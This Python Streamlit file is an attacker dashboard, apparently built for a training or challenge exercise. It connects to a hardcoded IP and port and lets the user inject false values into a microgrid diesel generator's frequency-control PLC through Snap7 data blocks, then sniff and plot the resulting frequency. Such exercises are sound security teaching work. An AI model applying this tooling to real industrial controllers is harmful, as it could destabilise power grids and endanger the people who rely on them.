import streamlit as st
from PIL import Image
from client import Client
import time
from collections import deque
from datetime import datetime
import plotly.graph_objs as go


IP_ADDRESS = "18.118.186.100"
PORT_NUM = 24564
DEQUE_LEN = 20


class Dashboard:
    def __init__(self):
        # session states
        if "connected" not in st.session_state:
            st.session_state["connected"] = False
        if "client" not in st.session_state:
            st.session_state["client"] = None
        if "plot_data" not in st.session_state:
            st.session_state["plot_data"] = {
                "x": deque(maxlen=DEQUE_LEN),
                "y": deque(maxlen=DEQUE_LEN),
            }

        # dashboard contents
        st.title("Hello bad guy!")
        self.attack_description_container = st.empty()
        self.connection_container = st.empty()
        injection_column1, sniffing_column1 = st.columns(2)
        with injection_column1:
            self.injection_parameters_container = st.empty()
        with sniffing_column1:
            self.sniffing_parameters_container = st.empty()

        st.header("Monitor Attack")
        injection_column2, sniffing_column2 = st.columns(2)
        with injection_column2:
            self.command_container = st.empty()
        with sniffing_column2:
            self.reconnaissance_container = st.empty()

        return

    def attack_description(self):
        with self.attack_description_container:
            with st.expander("Information about your task"):
                image = Image.open("diesel_generator.png")
                st.image(image, caption="Diesel Generator-based Microgrid")
                st.markdown(
                    "You will launch a cyberattacks against the master "
                    "*diesel generator* of a remote rural community electric "
                    "microgrid. "
                    "You will inject false data into the exposed unsecure port "
                    "of a local load-frequency control PLC of the generator.\n"
                    "\n"
                    "Below you will be able to select the data you inject and sniff "
                    "packets to monitor how the system reacts to your attack.\n"
                    "The injection slider below will let you inject false commands "
                    "and the sniffing window will allow you to monitor values. "
                    "An electric microgrid is in-crisis if the frequency deviates "
                    "to 1.8 Hz or more away from its nominal 60 Hz.\n"
                    "\n"
                    "Ready for the challenge? **Let's** **get** **this** **started** 😈"
                )
        return

    def connect_to_server(self):
        with self.connection_container:
            with st.expander("Connection details"):
                col1, col2 = st.columns(2)

                col1.text_input(
                    "Enter IP address",
                    value=IP_ADDRESS,
                    key="ip_address",
                )
                col2.number_input(
                    "Enter port number",
                    min_value=0,
                    max_value=65535,
                    step=1,
                    value=PORT_NUM,
                    key="port_number",
                )

                connected = st.session_state.get("connected", False)
                if not connected:
                    with st.spinner("Connecting"):
                        st.session_state["client"] = Client()
                        if st.session_state.get(
                            "ip_address", ""
                        ) and st.session_state.get("port_number", 0):
                            connected = st.session_state["client"].connect(
                                st.session_state["ip_address"],
                                st.session_state["port_number"],
                            )

                if connected:
                    st.success("Successfully connected to the target! 😈")
                    st.session_state["connected"] = True
                else:
                    st.error("Could not connect.")
        return

    def injection_parameters(self):
        with self.injection_parameters_container:
            with st.expander("Injection Parameters."):
                col1, col2 = st.columns(2)

                col1.number_input(
                    "Enter DB number",
                    min_value=0,
                    max_value=4,
                    step=1,
                    key="inject_db_number_input",
                    value=1,
                )
                col2.number_input(
                    "Enter start position",
                    min_value=0,
                    max_value=100,
                    step=1,
                    key="inject_db_start_input",
                    value=0,
                )
        return

    def command_window(self):
        def attack_injection():
            db_number = st.session_state.get("inject_db_number_input", 1)
            db_start = st.session_state.get("inject_db_start_input", 0)
            inject_value = st.session_state.get("inject_value", 0)

            if st.session_state.get("client", None):
                if st.session_state["client"].inject(inject_value, db_number, db_start):
                    print(f"Injected value {inject_value}.")

            return

        self.command_container.slider(
            "Select inject value",
            -1.0,
            1.0,
            step=0.1,
            key="inject_value",
            value=0.0,
            on_change=attack_injection,
        )

        return

    def sniffing_parameters(self):
        with self.sniffing_parameters_container:
            with st.expander("Sniffing Parameters"):
                st.selectbox(
                    "Select Snap7 area",
                    options=["Process Inputs", "Server Database"],
                    key="sniff_snap7_area",
                )
                col1, col2, col3 = st.columns(3)
                col1.number_input(
                    "DB number",
                    min_value=0,
                    max_value=4,
                    step=1,
                    key="sniff_db_number",
                    value=1,
                )
                col2.number_input(
                    "Start position",
                    min_value=0,
                    max_value=100,
                    step=1,
                    key="sniff_start_pos",
                    value=0,
                )
                col3.number_input(
                    "Numb of chars",
                    min_value=1,
                    max_value=100,
                    step=1,
                    key="sniff_num_chars",
                    value=4,
                )
        return

    def reconnaissance_window(self):
        if (
            st.session_state.get("sniff_snap7_area", "Server Database")
            == "Process Inputs"
        ):
            while True:
                st.session_state["plot_data"]["x"].append(
                    datetime.now().strftime("%H:%M:%S")
                )
                if st.session_state.get("client", None):
                    sniff_success, value = st.session_state["client"].sniff(
                        data_type="real",
                        db_number=st.session_state.get("sniff_db_number", 1),
                        start_pos=st.session_state.get("sniff_start_pos", 0),
                        num_chars=st.session_state.get("sniff_num_chars", 4),
                    )

                    if sniff_success:
                        st.session_state["plot_data"]["y"].append(60 + 60 * value)

                fig = go.Figure()
                fig.add_trace(
                    go.Scatter(
                        x=list(st.session_state["plot_data"]["x"]),
                        y=list(st.session_state["plot_data"]["y"]),
                        mode="lines+markers",
                        name="Recon Data",
                    )
                )
                fig.update_layout(
                    title="Live Reconnaissance Data",
                    xaxis_title="Time",
                    yaxis_title="Value",
                    yaxis=dict(range=[58, 62]),
                )

                self.reconnaissance_container.plotly_chart(
                    fig, use_container_width=True
                )
                time.sleep(0.5)
        else:
            if st.session_state.get("client", None):
                sniff_success, value = st.session_state["client"].sniff(
                    data_type="str",
                    db_number=st.session_state.get("sniff_db_number", 1),
                    start_pos=st.session_state.get("sniff_start_pos", 0),
                    num_chars=st.session_state.get("sniff_num_chars", 14),
                )

                if sniff_success:
                    self.reconnaissance_container.write(value)

        return

    def run(self):
        self.attack_description()
        self.connect_to_server()
        if st.session_state.get("connected", False):
            self.injection_parameters()
            self.command_window()
            self.sniffing_parameters()
            self.reconnaissance_window()

        return


if __name__ == "__main__":
    app = Dashboard()
    app.run()
